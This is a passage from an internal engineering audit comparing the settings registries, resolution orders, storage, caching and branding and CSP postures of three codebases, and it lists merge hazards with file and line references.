spec module and call `register_specs([...])` at import time —
`app/features/settings/spec.py:80-139` is the only such module today.
Governance: `tests/architecture/test_no_orphan_settings.py` fails the build if a
registered key has no string-literal reference under `app/` or the kernel
package, outside `app/features/settings/` and
`dotmac_kernel/settings_resolver.py`.

**Write path**: `settings_admin.py` (narrow re-export surface, :24-40) →
`validate_spec_value` (write-side, raises `BadRequestError`; rejects `None` for
every type, :300-301) → `upsert_by_key` :356-395. Platform-default seeding via
`ensure_by_key` :398-461 from `app/features/settings/seed.py`, run in the
lifespan under `platform_session`, gated by `SEED_ON_STARTUP`. `ensure_by_key`
carries a WARNING (:420-432) that its race-path `db.rollback()` is safe only
outside a request-scoped session (finding F3).

**Admin surfaces**: JSON `GET /settings/{domain}` and `PUT
/settings/{domain}/{key}` (`app/features/settings/router.py:26,36`); web
`/admin/settings`, `/admin/settings/{domain}/{key}/edit`,
`/admin/settings/branding` (`app/features/settings/web.py`). Both go through the
same `service.update_setting`.

**Caching: none** (settings_resolver.py:13-15 — "No caching here: phase 1 has no
Redis. Backlog: a Redis-backed settings cache lands in phase 3 (see
`dotmac_sub:app/services/settings_cache.py` for the shape to port)"). Two
derived per-request memos exist: `request.state.branding` (branding.py:249-267)
and `request.state.display` (`display.py:66-72`).

**No history table, no at-rest encryption, no secret specs.** `is_secret` masks
in the API (`MASKED_SECRET_VALUE` in `app/features/settings/service.py`), but no
registered spec sets it, so that path is untested against a real secret.

**Competing settings stores in the starter — three (four if wired):**

1. `dotmac_kernel.config.Settings` — pydantic-settings,
   `SettingsConfigDict(env_file=".env")` (config.py:11-47), ~20 operational
   knobs. Process-static, no DB, no tenant scope.
2. **Raw `os.getenv` in `branding.py`** (:130,:163) — bypasses `Settings` and,
   critically, does not read the `.env` file (§1.1).
3. **Raw `os.getenv` in `app/features/licensing/config.py:40,63,64`** —
   `LICENCE_VERIFICATION_KEYS`, `LICENCE_DEPLOYMENT_ID`,
   `LICENCE_REQUIRE_BINDING`.
4. Declared-but-unconsumed `ProductAssemblySpec.settings_overrides`
   (`assembly.py:49`) — a fourth layer if ever wired.

## 4.2 ERP

**Typed registry/resolver: yes** — `app/services/settings_spec.py` (1262 lines).

| symbol | line |
| --- | --- |
| `class SettingSpec(ListResponseMixin)` (frozen dataclass) | :15 |
| `SETTINGS_SPECS: list[SettingSpec]` (one flat literal) | :30 |
| `DOMAIN_SETTINGS_SERVICE` (domain → service singleton) | :1041-1066 |
| `get_spec` / `list_specs` | :1069 / :1076 |
| `resolve_value(db, domain, key, strict=False)` | :1080 |
| `extract_db_value` / `coerce_value` / `normalize_for_db` | :1184 / :1194 / :1223 |
| `validate_required_settings(db)` | :1236 |

`SettingSpec` fields (:15-28): `domain, key, env_var, value_type, default,
required, allowed, min_value, max_value, is_secret, label, description`.
**No `register_specs()`** — registration is appending a literal to
`SETTINGS_SPECS`. `SettingDomain` is a closed 22-member enum
(`app/models/domain_settings.py:36-57`). ERP alone has `resolve_value(...,
strict=True)` (:1099-1127), used by `validate_required_settings` at startup.

**Resolution order — DB row (org-preferred, then global) → spec default. Env is
never read at runtime.** `settings_spec.py:1104-1132`; the org→global tier lives
in `DomainSettings.get_by_key` (`app/services/domain_settings.py:420-445`):

```python
org_id = db.info.get("organization_id")
stmt = select(DomainSetting).where(
    DomainSetting.domain == self.domain,
    DomainSetting.key == key,
    DomainSetting.is_active.is_(True),
)
if org_id:
    stmt = stmt.where(
        or_(DomainSetting.organization_id == org_id,
            DomainSetting.organization_id.is_(None))
    ).order_by(
        case((DomainSetting.organization_id == org_id, 0), else_=1),
        DomainSetting.updated_at.desc(),
    )
```

**Two further, divergent orders inside ERP:**

- Feature flags — `app/services/feature_flag_service.py:5-10`,
  `app/models/feature_flag.py:60-64`: org row → global row →
  `FeatureFlagRegistry.default_enabled` → `False`.
- Settings UI — `app/services/module_settings_web.py:663-687` `_resolve_org_value`
  reads **only the org row, with no global fallback**, then `spec.default`. The
  admin UI therefore displays a different effective value from `resolve_value`
  whenever only a global row exists.

**Storage — nine+ tables:**

| table | model | file:line |
| --- | --- | --- |
| `domain_settings` | `DomainSetting` | `app/models/domain_settings.py:73` (tablename :77) |
| `domain_setting_history` | `DomainSettingHistory` | `app/models/domain_settings.py:126` (:140) |
| `feature_flag_registry` | `FeatureFlagRegistry` | `app/models/feature_flag.py:52` (:67) — metadata only |
| `core_config.system_configuration` | `SystemConfiguration` | `app/models/finance/core_config/system_configuration.py:32` (:38) |
| `sync.integration_config` | `IntegrationConfig` | `app/models/sync/integration_config.py:29` (:38) |
| `org_bank_directory` | | `app/models/settings/org_bank_directory.py:24` |
| `organization_branding` | `OrganizationBranding` | `.../organization_branding.py:47` (:60) |
| `core_org.organization` (settings **columns**) | `Organization` | `.../organization.py:60` |
| `core_config.numbering_sequence` | `NumberingSequence` | `.../numbering_sequence.py:75` |

`domain_settings` shape (`app/models/domain_settings.py:73-124`): unique
`(domain, key, organization_id)` → `uq_domain_settings_domain_key_org` (:78-80);
`organization_id` nullable FK, "NULL = global setting" (:95-100); `scope:
SettingScope` enum `GLOBAL | ORG_SPECIFIC` (:101-103, enum :65-70);
`value_text`/`value_json` with a CHECK (:81-86); **at-rest encryption** via
SQLAlchemy mapper listeners :207-241 (`_encrypt_secret_before_write`,
`_decrypt_secret_on_load`) backed by `app/services/settings_crypto.py` (Fernet,
`enc:` prefix, `bao://` OpenBao references).

**How a feature declares a setting (three or four steps):**

1. append a `SettingSpec` to `SETTINGS_SPECS` (`settings_spec.py:44-51`);
2. seed it, env-bootstrapped, in `app/services/settings_seed.py:40-45`
   (`seed_all_settings` invoked from `app/main.py:184`);
3. optionally add the key to a `ModuleSettingsConfig.setting_keys` list
   (`app/services/module_settings_web.py:42+`) to get a UI page — the domain is
   then inferred **by key prefix** in `_domain_for_key` (:694-711), a fragile
   string-prefix router falling through to `SettingDomain.settings`.

**Admin UI** (writes noted):

| route | file:line | writes |
| --- | --- | --- |
| `/settings` module pages | `app/web/settings.py:30,99,112,140,155` | `domain_settings`, **always `scope=ORG_SPECIFIC`** (`module_settings_web.py:582-652`) |
| `/admin/settings` raw CRUD | `app/web/admin.py:620,636,646` → `app/services/admin/web/organization_settings.py:649,713,780` | `domain_settings` |
| `/admin/settings/organization` | `app/web/admin.py:940,961` → `admin/settings_web.py:135,158` | `core_org.organization` **columns** |
| `/admin/settings/branding` | `admin/settings_web.py:244,342` | `organization_branding` |
| `/admin/settings/{email,features,payments,coach}` | `admin/settings_web.py:440-711` | `domain_settings` (+ `feature_flag_registry` for features) |
| REST `/settings/*` incl. export/import | `app/api/settings.py`, `app/services/settings_api.py:411,479` | `domain_settings` |

**Caching**: `app/services/settings_cache.py` (496 lines) — two-tier Redis +
in-memory fallback; `DOMAIN_TTL_CONFIG` per-domain TTL :33-70 (features/auth
60 s, email/scheduler/automation/reporting 300 s, audit/payments 600 s),
`DEFAULT_TTL = 300` :72; `InMemoryCache` :74 (TTL + LRU); `SettingsCache` :~250;
singleton :450; invalidation hooks in `domain_settings.py:290,407,505`. Feature
flags use a separate keyspace `ff:{org|global}:{flag}` (TTL 60/300,
`feature_flag_service.py:54-83`).

> **⚠ Two read paths, two answers.** `settings_spec.resolve_value` (:1080)
> **does not use `settings_cache` at all** — it goes straight to `get_by_key`,
> uncached, org-aware. Meanwhile `settings_cache.get_setting_value`
> (`settings_cache.py:337-345`) queries `DomainSetting` with **no
> `organization_id` filter**, so the cached path is org-blind and can return
> another tenant's value.

**Competing settings stores in ERP — fifteen:**

1. `app/config.py:33-373` — frozen dataclass `Settings` (not pydantic), ~200
   `os.getenv(...)` fields evaluated at import time, `settings = Settings()`
   :373, `dotenv.load_dotenv()` :7. Zero overlap enforcement with
   `SETTINGS_SPECS`.
2. `domain_settings` — the canonical spec-backed store.
3. `feature_flag_registry` + `app/services/feature_flag_service.py` — second
   registry, own order, own cache keyspace.
4. `app/services/feature_flags.py:17-30` — 14 hardcoded flag-key constants.
5. **`core_config.system_configuration`** — a **second generic key/value config
   table** (`organization_id` nullable, `config_key`/`config_value`/`config_type`
   with a `ConfigType` enum :26-30). Effectively dead: referenced only from
   `app/models/finance/__init__.py:159,397`. Direct competitor to
   `domain_settings`.
6. `sync.integration_config` — per-org external-system credentials, encrypted
   (`app/services/integration_config.py:63,81`), shares the Fernet key with
   `settings_crypto`.
7. **Settings-as-columns on `Organization`** — currency (:101-103), fiscal year
   (:105-107), `fund_accounting_enabled` (:142), `commitment_control_enabled`
   (:149), `pms_ohcsf_enabled` (:156), `performance_mode` (:163),
   timezone/date_format/number_format (:171-174), six `hr_*` settings
   (:193-222). Migrations `add_organization_settings_columns.py`,
   `add_hr_settings_to_org.py`.
8. `organization_branding` — competing with the `BRAND_*` env vars.
9. `org_bank_directory` + `app/services/settings/bank_directory.py`.
10. `core_config.numbering_sequence` — separate from the `*_prefix` keys in
    `domain_settings`.
11. `app/services/scheduler_config.py` — `_env_value`/`_env_int`/`_env_bool`
    (:19-40) **plus** `DomainSetting` (:9) **plus** `os.getenv("REDIS_URL")`
    (:151) — a three-way blend.
12. Hardcoded constant modules — `app/services/mailcow/config.py`,
    `app/services/dotmac_sub/sync/_constants.py`,
    `app/services/people/hr/web/constants.py:3-4`,
    `app/services/people/hr/default_letter_templates.py`.
13. `app/services/people/perf/pms_config_service.py:50` — seeds template rows as
    configuration.
14. `.env.example` (no `config/` YAML/JSON directory in ERP).
15. `scripts/settings_sync.py` + `scripts/settings_validate.py` — one-way env→DB
    sync driven by `spec.env_var` (`settings_sync.py:38-50`).

**No orphan-setting lint exists in ERP** — and the starter's `spec.py:10-12`
records that `custom_fields/max_per_entity` was "ported from ERP's orphan spec
(declared but never consumed there)".

## 4.3 Sub

**Typed registry/resolver: yes** — `app/services/settings_spec.py`
(**5182 lines**).

| symbol | line |
| --- | --- |
| `class SettingSpec(ListResponseMixin)` | :51 |
| `SCHEDULER_BOOLEAN_SETTING_KEYS` / `SCHEDULER_ENV_BOOTSTRAP_SETTING_KEYS` | :69 / :95 |
| `SETTINGS_SPECS` (main literal) / `.extend([...])` | :179 / :4484 |
| `_RETIRED_FEATURE_ALIAS_SPECS` filter rebuild | :4896 |
| `DOMAIN_SETTINGS_SERVICE` | :4902 |
| `get_spec` / `list_specs` | :4931 / :4938 |
| `resolve_value` | :4942 |
| `resolve_boolean` / `resolve_integer` / `resolve_string` | :4999 / :5013 / :5027 |
| `resolve_values_atomic(db, domain, keys)` | :5041 |
| `extract_db_value` / `coerce_value` / `normalize_for_db` | :5129 / :5139 / :5168 |

`SettingSpec` fields :51-67: `domain, key, env_var, value_type, default, label,
required, allowed, min_value, max_value, is_secret` — **no `description`**.
Docstring :52-56 states env is bootstrap-only and "Runtime resolvers never
consult it as an override." `SettingDomain` — 28 members
(`app/models/domain_settings.py:22-49`); `SettingValueType` is imported from
`app/models/subscription_engine.py`, not defined locally.

Two spec-builder helpers live outside the mega-file to dodge a circular import:
`app/services/settings_specs/integration.py`, `.../provisioning.py` (each takes
`setting_spec` as a callable argument).

Typed accessors Sub has and the others lack: `resolve_boolean`/`resolve_integer`/
`resolve_string` (:4999,:5013,:5027) **raise `RuntimeError` on an unregistered
key or type mismatch** — no silent fallback.

**Resolution order — Redis cache → active DB row → spec default. No org/tenant
tier at all. No env at runtime** (settings_spec.py:4942-4995). `get_by_key`
(`app/services/domain_settings.py`, class :26) has no organization branch —
Sub's `domain_settings` is single-tenant.

**Three further, divergent orders inside Sub:**

- `app/services/control_registry.py` (modules/features/safety gates), docstring
  :20-22: "explicit canonical DB row → registry default, with a per-control fail
  direction (`on_missing`)"; code :532-553; `is_enabled(db, key)` :694 ANDs the
  feature flag with its owning module flag. Its own docstring :2-5 admits "The
  app historically grew FIVE blended kinds of setting… resolved in different
  places with different fail directions."
- `app/services/module_manager.py:72-80` `_resolve_module_flag` — on
  `HTTPException` returns `default=True` (**fail-open**).
- `app/services/branding_config.py:9` — `defaults < brand.json < env`, i.e. **env
  wins**, the opposite of the DB-authoritative rule.

**Storage:**

| table | model | file:line |
| --- | --- | --- |
| `domain_settings` | `DomainSetting` | `app/models/domain_settings.py:52` (:54) |
| `subscription_engine_settings` | `SubscriptionEngineSetting` | `app/models/subscription_engine.py:42` (:43) |
| `table_column_config` (**per-user preferences**) | `TableColumnConfig` | `app/models/table_column_config.py:18` (:19) |
| `table_column_default_config` | `TableColumnDefaultConfig` | `app/models/table_column_default_config.py:11` (:12) |
| `brand_profiles` | `BrandProfile` | `app/models/branding.py:25` |
| `connector_configs` | | `app/models/connector.py:45` |
| `integration_config_revisions` | | `app/models/integration_platform.py:129` |
| plus `ai_intake_configs`, `kpi_configs`, router/SNMP/TR-069/ONT/NAS/OLT/UISP config tables | | see `app/models/{ai_intake,analytics,router_management,network,catalog,uisp_control}.py` |

`domain_settings` shape (:52-84): unique `(domain, key)` →
`uq_domain_settings_domain_key` (:56); `ck_domain_settings_value_alignment`
(:57-61); columns `id, domain, key, value_type, value_text, value_json,
is_secret, is_active, created_at, updated_at`. **No `organization_id`, no
`scope`, no history table, no ORM encryption listeners** — all four exist in ERP.

**How a feature declares a setting (four steps, one build-enforced):**

1. append to `SETTINGS_SPECS` (or return one from a `build_*_specs` helper —
   `app/services/settings_specs/provisioning.py:12-38`);
2. if it is a scheduler boolean, **also** add `(domain, key)` to
   `SCHEDULER_BOOLEAN_SETTING_KEYS` / `SCHEDULER_ENV_BOOTSTRAP_SETTING_KEYS`,
   or `app/services/scheduler_config.py:41-55` raises at runtime;
3. seed via `app/services/settings_seed.py` (2558 lines), invoked from
   `app/main.py:375,444+`;
4. **add a reader or the build fails** —
   `tests/architecture/test_no_orphan_settings.py:1-60` greps `app/**/*.py`,
   `templates/**/*.html`, `scripts/**/*.py` for the quoted key literal
   (excluding `settings_spec.py`/`settings_seed.py`). Docstring :19-21: "The
   historical orphan backlog was removed in July 2026… there is deliberately no
   allowlist." Also `tests/architecture/test_pipeline_settings_boundary.py`.

The admin UI is **fully generic** — `app/services/web_system_settings_views.py:138`
`build_settings_context` iterates `settings_spec.list_specs(domain)`, so a new
spec automatically gets a form field. No UI registration step.

**Admin UI**: `/admin/settings` 302 → `/admin/system/settings-hub`
(`app/web/admin/__init__.py:157-161`); hub `app/web/admin/system.py:4457`;
generic spec-driven GET/POST `app/web/admin/system.py:3402-3468` →
`web_system_settings_views.py:138,289` / `web_system_settings_forms.py:22,91,96`;
branding POST :3472 (explicitly rejected by the generic handler at
`web_system_settings_forms.py:128-133`); control plane :4484
(`control_registry.update_canonical_feature_controls` :633); modules POST :378
(`module_manager.update_module_flags` :244); plus catalog, ticket, inbox, and
payment-configuration surfaces. REST `/settings/{domain}` via
`app/api/settings.py:11` (a 13-line shim) → `settings_api.py` →
`settings_api_generic.py` + `settings_api_custom.py`. Nearly every route is
gated by `require_permission("system:settings:read"|"…:write")`.

**Caching**: `app/services/settings_cache.py` (194 lines) — **Redis-only**, no
in-memory tier. `PREFIX = "settings:"` :39, **`TTL = 30`** seconds :40 (flat, no
per-domain map — contrast ERP's `DOMAIN_TTL_CONFIG`). Methods `get` :47, `set`
:69, `invalidate` :94, `invalidate_domain` :116 (SCAN-based), `get_multi` :138,
`set_multi` :167 (pipelined). Wired **directly into the resolver** at
`settings_spec.py:4956` (read), :4993 (write), :5075/:5124
(`resolve_values_atomic`). Degrades silently to uncached when Redis is down.

**Competing settings stores in Sub — seventeen:**

1. `app/config.py:9-280` — frozen dataclass `Settings`, ~120 `os.getenv(...)`
   at class-definition time, `load_dotenv()` :6. Its own comment (~:275) admits
   the split, saying automated dispatch config "is NOT configured here… so an
   operator can arm, disarm or re-tighten automation from the admin UI".
2. `domain_settings` — canonical, spec-backed.
3. `app/services/control_registry.py` (`_CONTROLS` :483) — a second registry over
   `SettingDomain.modules`, with `Control`/`LegacyAlias`/`ControlResolution`
   dataclasses (:71,:58,:87), a `Layer` enum (:51), and its own `on_missing`
   fail direction.
4. `app/services/module_manager.py` — `MODULE_KEY_MAP` :25, `load_module_states`
   :87, `_upsert_boolean_setting` :230, `update_module_flags` :244. Writes
   `SettingDomain.modules` rows directly, bypassing the spec registry.
5. `brand.json` + `app/services/branding_config.py` — JSON config shared with
   the Flutter app; env > file > default, the inverse of the DB rule.
   **Plus** `brand_profiles` (below), `app/web/brand_globals.py`,
   `app/web/portal_branding.py`, `app/api/branding.py`.
6. **`brand_profiles` table** — a *second* authority for fields that also exist
   as `comms`-domain settings (`sidebar_logo_url`, `sidebar_logo_dark_url`,
   `favicon_url`, `brand_primary_color`, `brand_secondary_color`, the five
   semantic colours). `resolve_brand` layers the profile *over* the setting, and
   `sync_platform_brand_from_legacy_settings` (`brand_profiles.py:289-320`)
   exists to copy one into the other — an explicit, in-flight migration between
   two live writers.
7. **Spec-bypassing writer against `domain_settings`** —
   `app/services/web_system_company_info.py:36-83` upserts rows in the `billing`
   domain by hand (`COMPANY_KEYS` :18-34), with no `SettingSpec`, no validation,
   and no resolver. Company legal name, email, phone, postal address, VAT
   number, registration ID, and bank details — all brand-bearing — live here.

   > **Corrected 2026-08-03, on evidence** (this entry originally said "direct
   > SQL" and was cited elsewhere as Sub's third logo/favicon/colour writer):
   > it uses the ORM (`DomainSetting(...)` + `db.add`), not raw SQL, and it
   > writes **no** logo, favicon, or colour key — so it was never the branding
   > source-of-truth violation, though it *is* genuinely spec-bypassing, which
   > is what this entry is really about. The dangling branding writer this
   > inventory MISSED is the generic comms settings form
   > (`web_system_settings_forms.process_settings_update`), which wrote all 13
   > branding keys with none of the owner's validators. See ADR-0006's
   > "Live defects" §3 and branch `chore/branding-writer-consolidation`.
8. `config/` directory: `config/freeradius/*` (radiusd.conf, dictionary,
   mods-enabled/sql, sites-enabled, schema.sql + 3 upgrade SQL files,
   sql/admin_schema.sql), `config/promtail/promtail-config.yml`,
   `config/vmagent/config.yml`.
9. **`subscription_engine_settings`** — a second generic key/value settings
   table keyed by `engine_id` instead of domain, same
   `value_type/value_text/value_json/is_secret` shape.
10. `table_column_config` (per-user) + `table_column_default_config` (global),
    service `app/services/table_config.py`, schema `app/schemas/table_config.py`.
11. `app/services/smart_defaults.py:17` `SmartDefaultsService` — its **own**
    `_get_setting` (:26-50) re-implementing the Redis-then-DB read instead of
    calling `resolve_value`, plus REST `/defaults` (`app/api/defaults.py:14`).
12. `app/services/support_ticket_settings.py` — key constants :31-39 and
    hardcoded `DEFAULT_*_OPTIONS` / `DEFAULT_SLA_POLICY` :41-60.
13. `app/services/billing_settings.py` — "resolving billing settings **with
    legacy fallbacks**" (:1), hardcoded status tuples :14,:30, own `_coerce_int`
    :37.
14. `app/services/scheduler_config.py` — `os` (:2) + typed resolvers +
    hardcoded `TR069_TASK_QUEUE_NAMES` :25.
15. `app/services/{genieacs_config,web_catalog_settings,branding_config,
    field/config,channel_health_contracts,brand_theme}.py` — constants imported
    into `settings_spec.py:11-17` as spec defaults; `field/config.py:33` does a
    direct `db.query`.
16. `app/services/settings_secret_cleanup.py` — separate secret lifecycle path.
17. `.env.example`, `docker-compose*.yml` env blocks, `nginx/`, `docker/`,
    `deploy/`; plus a stray `scratchpad/crm-import-reference/crm_inbox_settings.py`
    outside `app/`.

## 4.4 Side-by-side

| dimension | starter | ERP | Sub |
| --- | --- | --- | --- |
| registry file size | ~470 lines (kernel) | 1262 lines | **5182 lines** |
| `SettingDomain` members | 5 | 22 | 28 |
| registration mechanism | `register_specs([...])` at import | append to a literal list | append to a literal list |
| `SettingSpec.env_var` | **absent (deliberately dropped)** | present, bootstrap-only | present, bootstrap-only |
| `SettingSpec.validator` callable | **present** | absent | absent |
| `SettingSpec.description` | absent (`label` only) | present | absent |
| tenant/org tier in the table | `tenant_id` nullable + 2 partial unique indexes + RLS | `organization_id` + `scope` enum, unique `(domain,key,org)` | **none** |
| platform/global default row | `tenant_id IS NULL` | `organization_id IS NULL` | n/a |
| resolution order | tenant → platform → default | org row → global row → default | Redis → row → default |
| provenance returned | **`resolve_with_source`** | no | no |
| typed accessors | no (generic + `default=`) | `strict=` flag | `resolve_boolean/integer/string`, `resolve_values_atomic` |
| cache in the resolver | **none** | **none** (separate, org-blind cache service) | Redis, TTL 30 s |
| per-domain cache TTL | n/a | `DOMAIN_TTL_CONFIG` 60-600 s | flat 30 s |
| change-history table | no | `domain_setting_history` | no |
| secret encryption at rest | no (API masking only) | ORM listeners + Fernet + `bao://` refs | no |
| write-path validation | `validate_spec_value` → 400 | per-endpoint schemas | spec-based + **direct SQL bypass** |
| orphan-setting lint | yes, allowlist **empty** | **none** (known orphans) | yes, **no allowlist at all** |
| admin settings UI | generic + one friendly branding editor | hand-written per module | fully generic, spec-driven |
| second generic KV config table | no | `core_config.system_configuration` (orphaned) | `subscription_engine_settings` |
| JSON/YAML config files | `brand.json` only | none | `brand.json` + `config/{freeradius,promtail,vmagent}` |
| per-user preferences table | no | no | `table_column_config` |
| competing stores counted | **3** (+1 unwired) | **15** | **17** |

---

# 5. Settings-spec inventory — the starter

Every `SettingSpec` actually registered. Source of all seven:
`app/features/settings/spec.py:80-139` (`register_specs(SPECS)` at :139),
imported for side effect by `app/features/settings/__init__.py`.

| # | domain | key | type | default | constraints | reader (`resolve_value`) |
| --- | --- | --- | --- | --- | --- | --- |
| 1 | `auth` | `registration_policy` | string | `"closed"` | `allowed={open, closed}` | `app/features/auth/service.py:92-98` — gates `POST /auth/register` |
| 2 | `custom_fields` | `max_per_entity` | integer | `20` | `min=1`, `max=100` | `app/features/custom_fields/service.py:186-192` — field-count cap |
| 3 | `branding` | `ui_branding` | json | `{}` | — | `packages/dotmac-kernel/src/dotmac_kernel/branding.py:227-229` — `load_branding` |
| 4 | `audit` | `retention_days` | integer | `365` | `min=1` | `app/features/rbac/service.py:186-192` — audit retention cutoff |
| 5 | `display` | `timezone` | string | `"UTC"` | `validator=_validate_timezone` (spec.py:24-28) | `packages/dotmac-kernel/src/dotmac_kernel/display.py:46` |
| 6 | `display` | `date_format` | string | `"%Y-%m-%d"` | `validator=_validate_strftime` (spec.py:39-77) | `.../display.py:57` |
| 7 | `display` | `datetime_format` | string | `"%Y-%m-%d %H:%M"` | `validator=_validate_strftime` | `.../display.py:60-62` |

**Registered specs: 7. Orphans (no reader): 0.**
`tests/architecture/test_no_orphan_settings.py:50` pins
`_ALLOWED_ORPHAN_SETTINGS: set[str] = set()` — empty, documented as allowed only
to shrink. No `is_secret=True` spec exists, so the API masking path
(`MASKED_SECRET_VALUE`) is untested against a real secret. All five
`SettingDomain` members are used; no dead domain.

`spec.py:10-12` records that `custom_fields/max_per_entity` was **ported from
ERP's orphan spec** (declared but never consumed there) and given a real
consumer here — a concrete instance of the starter's lint catching what ERP's
absence of one let through.

**Adjacent orphan, different kind:** `ui_branding` has a reader, but three of its
six allowlisted sub-keys do not — `logo_url` (editable, never rendered), and
from the static layer `support_email` and `app_url`. The no-orphan test operates
at spec-key granularity and cannot see inside a `json` spec, so **sub-key dead
controls pass the build silently**. A `BrandProfile` with one field per column
would make these visible; a single opaque `ui_branding` blob structurally cannot.

---

# 6. Collision and divergence findings

## 6.1 Three different precedence chains for the same question

| repo | chain (lowest → highest) | depth |
| --- | --- | --- |
| starter | defaults < brand.json < env < tenant setting < route context | 5 |
| ERP | env `Settings` < `Organization` row (conditional) < `organization_branding` row | 3 |
| Sub | defaults < brand.json < env < billing/comms settings < platform profile < reseller profile < organization profile | 7 |

A naive merge picks one and breaks the others:

- **Adopting the starter's chain loses reseller/OEM scoping.** Sub's reseller
  tier (`BrandProfile(scope_type='reseller')`) has no analogue in the starter's
  flat tenant model; an ISP reseller white-labelling to its own sub-brand cannot
  be expressed as a single `ui_branding` row. It also loses ERP's
  Organization-row fallback, which is what makes an ERP tenant show its legal
  name before anyone configures branding at all.
- **Adopting Sub's chain requires a tenant dimension it does not have.** Sub's
  `domain_settings` has **no `organization_id`/`tenant_id` column** (unique on
  `(domain, key)`); the starter's has a nullable `tenant_id` with two partial
  unique indexes and RLS; ERP's has `organization_id` plus a `scope` enum and a
  three-column unique. Merging the tables is a schema change plus an RLS policy,
  not a data move.
- **Adopting ERP's chain loses the static layer entirely.** ERP has no
  `brand.json` — no file-based deployment identity to white-label from — and its
  Organization-row fallback actively overwrites a deliberately-set display name
  that happens to equal the platform default (the sentinel bug, §1.2).

## 6.2 The same key name means three different things at runtime

`BRAND_PRIMARY_COLOR` / `primary_color`:

- **starter** — a hex string rendered into **two inline `style=` swatches** on
  one page and nothing else; the actual palette is compiled into Tailwind at
  build time (`static/css/src/main.css:26-36`).
- **Sub** — a hex string **expanded into an 11-stop scale and served as
  `:root{--color-primary-*}`** at `GET /branding/theme.css`, driving the whole UI
  at runtime.
- **ERP** — a hex string written into `--brand-primary`/`--teal` plus
  auto-generated light/dark shades by `CSSGenerator`
  (`app/services/finance/branding.py:200-236`, `generate_color_palette` :66-104).

Same env var, same JSON key, three incompatible runtime meanings. A shared
`brand.json` moved between deployments produces a fully re-themed Sub, a
partially re-themed ERP, and a visually unchanged starter.

## 6.3 `brand.json` is not the same file

- starter resolves it from **`Path.cwd()`** (branding.py:139) — deliberately,
  because the kernel is pip-installable and must not look next to its own
  package.
- Sub resolves it from **`Path(__file__).parents[2]`** (branding_config.py:79) —
  the repo root, independent of cwd.
- ERP has no such file.

Merging the loaders changes where an existing Sub deployment finds its brand
file whenever the process cwd is not the repo root (a systemd unit with a
different `WorkingDirectory`, a container with a different `WORKDIR`). The
failure is **silent**: both `_load_file` implementations log at INFO and return
`{}` (branding_config.py:86-87 / branding.py:147).

Sub's `brand.json` is also **consumed by a second runtime** (Flutter
`--dart-define-from-file`) and carries four keys the Python side ignores
(`BRAND_MOBILE_APP_NAME`, `API_BASE_URL`, `GLITCHTIP_DSN`,
`GLITCHTIP_ENVIRONMENT`). Any consolidation that tightens the file schema, or
moves brand identity into the DB, breaks the mobile build — and
`mobile/dart_defines.example.json` already contradicts `brand.json` on two keys.

## 6.4 Static-brand defaults carry a real company in one repo

`dotmac_sub/app/services/branding_config.py:56-72` ships the **actual DotMac
production identity** as built-in defaults (`"DotMac"`,
`"Dotmac Technologies"`, `support@dotmac.ng`, `noreply@dotmac.ng`,
`https://selfcare.dotmac.io`, payment scheme `dotmacpay`). The starter
explicitly refuses to do this (branding.py:94-97: "this starter ships no
production identity to accidentally leak into a white-labeled fork"); ERP
defaults to `"Dotmac ERP"` (`app/config.py:69`). If the consolidated kernel
adopts Sub's defaults module wholesale, every unbranded fork silently becomes
DotMac — including its `from_email`, which would send mail claiming to be
`noreply@dotmac.ng`, and its mobile payment URL scheme, which
`mobile/lib/src/config/env.dart:110-111` explicitly says must be unique per
brand so two white-label apps on one device do not collide.

## 6.5 Custom CSS: two implementations, one absent, incompatible postures

Covered in §3. The merge hazards specifically:

- **starter → kernel-wide.** If the sanitized `custom_css` injection is promoted
  from the branding-editor page to a portal-wide `<style>` block (the obvious
  product request), every hazard in §3.5 items 1-4 goes global, and the kernel
  cannot then tighten `style-src`.
- **ERP onto the kernel.** If `organization_branding.custom_css` is mapped onto
  `ui_branding.custom_css`, the sanitizer suddenly applies, and every existing
  ERP org whose CSS uses `@import`, a `data:` background, or **any `<`
  character** has its branding silently blanked (`sanitize_branding_css` returns
  `""` on any `<`). Conversely, keeping ERP's injection point gives the kernel a
  portal-wide unsanitized `<style>` and makes the starter's CSP guarantees
  (`tests/unit/test_security_baseline.py:191-199`) false.
- **ERP's escape valve.** ERP tenants reach for `custom_css` partly because the
  three shape presets (`border_radius`, `button_style`, `sidebar_style`) are
  coarse. Retiring raw CSS without promoting those to real tokens will produce
  pressure to re-add it.

## 6.6 CSP postures are mutually exclusive

starter: 10 directives, no external origins, pinned by test. ERP: 1 directive,
allowing `https://cdn.jsdelivr.net` and (as deployed) `'unsafe-inline'` script.
Sub: none.

A shared kernel emitting the starter's `_STRICT_CSP` by default **breaks ERP on
the first request**: jsdelivr scripts violate `script-src 'self'`, and the
per-organization Google Fonts stylesheet
(`GET /branding/org/{org_id}/fonts-url`, `app/api/settings.py:736-745`) violates
both `style-src 'self'` and `font-src 'self'`. Because the fonts URL is a
**runtime per-org value**, it cannot even be added to a static allowlist without
conceding a wildcard. Sub, by contrast, would gain a CSP it currently lacks
essentially for free — it already vendors fonts and emits no tenant CSS.

## 6.7 Two competing brand writers already exist inside Sub

`brand_profiles` vs `comms`/`billing`-domain settings for logo, dark logo,
favicon, primary/secondary colour, and the five semantic colours (§4.3 item 6).
`sync_platform_brand_from_legacy_settings` (`brand_profiles.py:289-320`) is a
one-directional copy with an explicit `overwrite_fields` set, and `_legacy_brand`
is still read as the base layer on **every** resolve. The admin branding POST
writes the settings rows first and then syncs to the profile
(`app/web/admin/system.py:3714-3729`), so the settings rows remain a live
writer. Consolidating onto a single `BrandProfile` must finish this migration —
otherwise the foundation inherits a dangling legacy writer, a direct violation
of SOT criterion 5.

Sub also has an in-flight second front: `web_system_company_info.save_company_info`
(:50-83) writes billing-domain settings by raw SQL and *then* calls the same
sync with `overwrite_fields={"product_name","legal_name","support_email",
"support_phone","legal_address"}` — a third path into the same fields.

## 6.8 Settings storage shapes do not line up

See the §4.4 table. Three specifics that block a naive merge:

1. **The tenant column differs three ways** — `tenant_id` nullable (starter),
   `organization_id` + `scope` enum (ERP), absent (Sub). Merging Sub's table
   means adding the column, the partial unique indexes, and RLS, then deciding
   what an existing single-tenant row becomes (platform default, or the sole
   tenant's row — they are not the same thing once a second tenant appears).
2. **`env_var` on the spec.** ERP and Sub both carry it (bootstrap-only, synced
   env→DB by `scripts/settings_sync.py` in ERP and `settings_seed.py` in Sub);
   the starter deliberately dropped it (settings_resolver.py:52-55) and seeds
   explicitly. Re-merging means answering "may a spec name an env var at all",
   which is the same question as "does env beat the DB" — and the starter's env
